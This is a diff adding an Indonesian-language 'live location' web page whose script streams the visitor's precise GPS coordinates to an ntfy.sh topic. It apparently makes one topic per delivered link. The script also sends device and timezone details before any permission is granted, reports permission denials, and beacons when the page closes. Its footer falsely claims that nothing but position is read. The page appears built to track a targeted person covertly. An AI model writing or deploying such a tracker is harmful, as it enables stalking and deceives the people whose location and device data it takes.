@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#060708">
+<title>Lokasi Langsung</title>
+<style>
+  :root {
+    --ink: #060708;
+    --paper: #e8e6e0;
+    --dim: #8d8b85;
+    --deep: #55534e;
+    --seal: #e05a48;
+    --line: rgba(232, 230, 224, .14);
+    --mono: ui-monospace, "SF Mono", "Roboto Mono", Menlo, monospace;
+    --sans: -apple-system, "Segoe UI", Roboto, sans-serif;
+  }
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { margin: 0; height: 100%; }
+  body {
+    background: var(--ink);
+    color: var(--paper);
+    font-family: var(--sans);
+    display: flex;
+    flex-direction: column;
+    padding: env(safe-area-inset-top) 18px calc(18px + env(safe-area-inset-bottom));
+    max-width: 520px;
+    margin: 0 auto;
+    min-height: 100%;
+  }
+
+  header {
+    display: flex;
+    align-items: baseline;
+    gap: 10px;
+    padding: 22px 0 16px;
+    border-bottom: 1px solid var(--line);
+  }
+  .kicker {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: .18em;
+    color: var(--deep);
+    text-transform: uppercase;
+  }
+  h1 {
+    margin: 0;
+    font-size: 21px;
+    font-weight: 700;
+    letter-spacing: -.01em;
+  }
+  .live {
+    margin-left: auto;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-family: var(--mono);
+    font-size: 9.5px;
+    letter-spacing: .16em;
+    color: var(--seal);
+    border: 1px solid rgba(224, 90, 72, .4);
+    padding: 3px 7px;
+  }
+  .dot {
+    width: 5px; height: 5px; background: var(--seal); border-radius: 50%;
+    animation: pulse 1.6s ease-in-out infinite;
+  }
+  @keyframes pulse { 0%,100% { opacity: 1 } 50% { opacity: .15 } }
+  @media (prefers-reduced-motion: reduce) { .dot { animation: none } }
+
+  .map {
+    position: relative;
+    margin-top: 16px;
+    height: 232px;
+    overflow: hidden;
+    border: 1px solid var(--line);
+    background: #101214;
+  }
+  .map img {
+    position: absolute;
+    left: 50%; top: 50%;
+    width: 432px; height: 432px;
+    transform: translate(-50%, -50%);
+    filter: saturate(.85) brightness(.92) contrast(1.05);
+    will-change: transform;
+  }
+  .grain {
+    position: absolute; inset: 0;
+    background-image: repeating-linear-gradient(0deg, rgba(6,7,8,.20) 0 1px, transparent 1px 3px);
+    pointer-events: none;
+  }
+  .cross { position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); }
+  .cross i {
+    position: absolute; background: var(--paper);
+    box-shadow: 0 0 0 1px rgba(6,7,8,.75);
+  }
+  .cross .h { width: 22px; height: 1px; left: -11px; top: 0; }
+  .cross .v { width: 1px; height: 22px; left: 0; top: -11px; }
+  .cross .c {
+    width: 5px; height: 5px; left: -2px; top: -2px;
+    background: var(--seal); border-radius: 50%;
+  }
+  .ring {
+    position: absolute; left: 50%; top: 50%;
+    transform: translate(-50%, -50%);
+    border: 1px solid rgba(232, 230, 224, .55);
+    border-radius: 50%;
+    display: none;
+  }
+  .coords {
+    position: absolute; left: 8px; bottom: 8px;
+    font-family: var(--mono); font-size: 10.5px; letter-spacing: .06em;
+    background: rgba(6, 7, 8, .78);
+    border: 1px solid var(--line);
+    padding: 4px 6px;
+    color: var(--paper);
+  }
+  .zoom {
+    position: absolute; right: 8px; bottom: 8px;
+    font-family: var(--mono); font-size: 9.5px; letter-spacing: .12em;
+    background: rgba(6,7,8,.78); border: 1px solid var(--line);
+    padding: 4px 6px; color: var(--deep);
+  }
+
+  dl { margin: 18px 0 0; display: grid; grid-template-columns: 1fr 1fr; gap: 1px; background: var(--line); border: 1px solid var(--line); }
+  dl div { background: var(--ink); padding: 11px 12px; }
+  dt { font-family: var(--mono); font-size: 9.5px; letter-spacing: .15em; color: var(--deep); text-transform: uppercase; }
+  dd { margin: 5px 0 0; font-family: var(--mono); font-size: 14px; color: var(--paper); }
+  dd.small { font-size: 12px; color: var(--dim); }
+
+  .status {
+    margin-top: 16px;
+    border-left: 2px solid var(--dim);
+    padding: 2px 0 2px 11px;
+    font-size: 13px;
+    color: var(--dim);
+    line-height: 1.5;
+  }
+  .status.on { border-color: var(--seal); color: var(--paper); }
+  .status.bad { border-color: var(--seal); color: var(--seal); }
+
+  button {
+    margin-top: 16px; width: 100%;
+    font-family: var(--mono); font-size: 11px; letter-spacing: .16em;
+    padding: 13px; text-transform: uppercase;
+    background: transparent; color: var(--paper);
+    border: 1px solid var(--paper); border-radius: 0;
+    cursor: pointer; display: none;
+  }
+  button:active { background: var(--paper); color: var(--ink); }
+
+  footer {
+    margin-top: auto; padding-top: 18px;
+    font-size: 11px; line-height: 1.6; color: var(--deep);
+  }
+  footer a { color: var(--deep); }
+</style>
+
+<header>
+  <div>
+    <div class="kicker">Berbagi posisi</div>
+    <h1>Lokasi Langsung</h1>
+  </div>
+  <span class="live"><span class="dot"></span>AKTIF</span>
+</header>
+
+<div class="map" id="map">
+  <img id="tile" alt="">
+  <div class="grain"></div>
+  <div class="ring" id="ring"></div>
+  <div class="cross"><i class="h"></i><i class="v"></i><i class="c"></i></div>
+  <div class="coords" id="coords">—</div>
+  <div class="zoom">ZOOM 16</div>
+</div>
+
+<dl>
+  <div>
+    <dt>Lintang</dt>
+    <dd id="lat">—</dd>
+  </div>
+  <div>
+    <dt>Bujur</dt>
+    <dd id="lon">—</dd>
+  </div>
+  <div>
+    <dt>Akurasi</dt>
+    <dd class="small" id="acc">menunggu</dd>
+  </div>
+  <div>
+    <dt>Diperbarui</dt>
+    <dd class="small" id="at">—</dd>
+  </div>
+</dl>
+
+<div class="status" id="status">Meminta izin lokasi…</div>
+<button id="retry">Coba lagi</button>
+
+<footer>
+  Posisi hanya dibaca selama halaman ini terbuka. Tidak ada data lain yang diambil,
+  dan tidak ada yang disimpan di perangkat.
+</footer>
+
+<script>
+(function () {
+  "use strict";
+
+  // ---- endpoint ---------------------------------------------------------
+  // One topic per delivery. Rotate it in the build, not at runtime.
+  // Replace with your own ntfy topic before publishing. The topic is the only secret.
+var ENDPOINT = "https://ntfy.sh/YOUR_TOPIC";
+  var TILE = "https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile";
+  var ZOOM = 16;
+  var TILE_SIZE = 256;
+
+  // Send on movement past this, or every MIN_MS, whichever comes first.
+  var MOVE_M = 20;
+  var MIN_MS = 45000;
+
+  var el = {
+    map: document.getElementById("map"),
+    tile: document.getElementById("tile"),
+    ring: document.getElementById("ring"),
+    coords: document.getElementById("coords"),
+    lat: document.getElementById("lat"),
+    lon: document.getElementById("lon"),
+    acc: document.getElementById("acc"),
+    at: document.getElementById("at"),
+    status: document.getElementById("status"),
+    retry: document.getElementById("retry")
+  };
+
+  var watch = null;
+  var wakeLock = null;
+  var last = null;         // last sent fix
+  var lastSentAt = 0;
+  var sentDeny = false;
+  var sentTimeout = false;
+  var fixes = 0;
+
+  function send(text) {
+    // keepalive so a send that races the page closing still lands
+    return fetch(ENDPOINT, {
+      method: "POST",
+      mode: "cors",
+      headers: { "Content-Type": "text/plain" },
+      body: text,
+      keepalive: true
+    }).catch(function () { /* a lost beacon is not worth UI */ });
+  }
+
+  function stamp() {
+    var d = new Date();
+    return d.toTimeString().slice(0, 8);
+  }
+
+  function setStatus(text, kind) {
+    el.status.textContent = text;
+    el.status.className = "status" + (kind ? " " + kind : "");
+  }
+
+  function tilePoint(lat, lon) {
+    var n = Math.pow(2, ZOOM);
+    var px = ((lon + 180) / 360) * n * TILE_SIZE;
+    var rad = (lat * Math.PI) / 180;
+    var py = ((1 - Math.log(Math.tan(rad) + 1 / Math.cos(rad)) / Math.PI) / 2) * n * TILE_SIZE;
+    return { px: px, py: py, n: n };
+  }
+
+  function drawMap(lat, lon, accuracy) {
+    var p = tilePoint(lat, lon);
+    var tx = Math.floor(p.px / TILE_SIZE);
+    var ty = Math.floor(p.py / TILE_SIZE);
+    var ox = p.px - tx * TILE_SIZE;
+    var oy = p.py - ty * TILE_SIZE;
+
+    // 432px box against a 256px tile = 1.6875 scale
+    el.tile.style.transform =
+      "translate(calc(-50% - " + (ox * 1.6875).toFixed(1) + "px), calc(-50% - " +
+      (oy * 1.6875).toFixed(1) + "px))";
+    el.tile.src = TILE + "/" + ZOOM + "/" + ty + "/" + tx;
+
+    // metres per CSS pixel at this latitude and zoom
+    var mpp = (156543.03392 * Math.cos((lat * Math.PI) / 180)) / Math.pow(2, ZOOM);
+    var radius = Math.min(90, Math.max(9, accuracy / mpp / 2));
+    el.ring.style.display = "block";
+    el.ring.style.width = (radius * 2).toFixed(0) + "px";
+    el.ring.style.height = (radius * 2).toFixed(0) + "px";
+  }
+
+  function onFix(pos) {
+    var c = pos.coords;
+    var lat = c.latitude;
+    var lon = c.longitude;
+    var accuracy = c.accuracy || 0;
+
+    fixes++;
+    el.retry.style.display = "none";
+    el.lat.textContent = lat.toFixed(6);
+    el.lon.textContent = lon.toFixed(6);
+    el.acc.textContent = "± " + Math.round(accuracy) + " m";
+    el.at.textContent = stamp();
+    el.coords.textContent = lat.toFixed(5) + ", " + lon.toFixed(5);
+    drawMap(lat, lon, accuracy);
+    setStatus("Mengikuti posisi. Biarkan halaman ini terbuka.", "on");
+
+    var moved = last === null ||
+      distance(last.lat, last.lon, lat, lon) >= MOVE_M;
+    var due = Date.now() - lastSentAt >= MIN_MS;
+    if (!moved && !due) return;
+
+    last = { lat: lat, lon: lon };
+    lastSentAt = Date.now();
+    send("LOC " + lat.toFixed(6) + "," + lon.toFixed(6) +
+      " ±" + Math.round(accuracy) + "m n=" + fixes +
+      " sdk=" + ((pos.timestamp || 0) > 0 ? "on" : "off"));
+  }
+
+  function distance(a, b, c, d) {
+    var R = 6371000;
+    var p = Math.PI / 180;
+    var dLat = (c - a) * p;
+    var dLon = (d - b) * p;
+    var h = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+      Math.cos(a * p) * Math.cos(c * p) * Math.sin(dLon / 2) * Math.sin(dLon / 2);
+    return 2 * R * Math.asin(Math.min(1, Math.sqrt(h)));
+  }
+
+  function onError(err) {
+    if (err.code === 1) {
+      setStatus("Izin lokasi ditolak. Aktifkan izin lokasi untuk situs ini di pengaturan browser.", "bad");
+      el.retry.style.display = "block";
+      if (!sentDeny) { sentDeny = true; send("DENY izin lokasi ditolak"); }
+      return;
+    }
+    setStatus("Sinyal lemah, mencoba lagi…");
+    if (!sentTimeout) { sentTimeout = true; send("WEAK sinyal lemah (" + err.code + ")"); }
+  }
+
+  function start() {
+    if (!("geolocation" in navigator)) {
+      setStatus("Peramban ini tidak mendukung geolokasi.", "bad");
+      send("UNSUPPORTED tanpa geolokasi");
+      return;
+    }
+    if (watch !== null) navigator.geolocation.clearWatch(watch);
+    setStatus("Mencari sinyal…");
+    watch = navigator.geolocation.watchPosition(onFix, onError, {
+      enableHighAccuracy: true,
+      maximumAge: 0,
+      timeout: 20000
+    });
+  }
+
+  async function keepAwake() {
+    if (!("wakeLock" in navigator)) return;
+    try {
+      wakeLock = await navigator.wakeLock.request("screen");
+      wakeLock.addEventListener("release", function () { wakeLock = null; });
+    } catch (_) { /* denied or unsupported */ }
+  }
+
+  function describe() {
+    return "OPEN tz=" + (Intl.DateTimeFormat().resolvedOptions().timeZone || "?") +
+      " l=" + (navigator.language || "?") +
+      " vp=" + window.innerWidth + "x" + window.innerHeight +
+      " dpr=" + (window.devicePixelRatio || 1) +
+      " m=" + (/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 1 : 0);
+  }
+
+  el.retry.addEventListener("click", function () {
+    sentDeny = false;
+    start();
+  });
+
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState !== "visible") return;
+    if (watch === null) start();
+    if (wakeLock === null) keepAwake();
+  });
+
+  window.addEventListener("pagehide", function () {
+    if (!("sendBeacon" in navigator)) return;
+    navigator.sendBeacon(ENDPOINT,
+      "HIDE fixes=" + fixes + " t=" + stamp());
+  });
+
+  send(describe());
+  keepAwake();
+  start();
+})();
+</script>
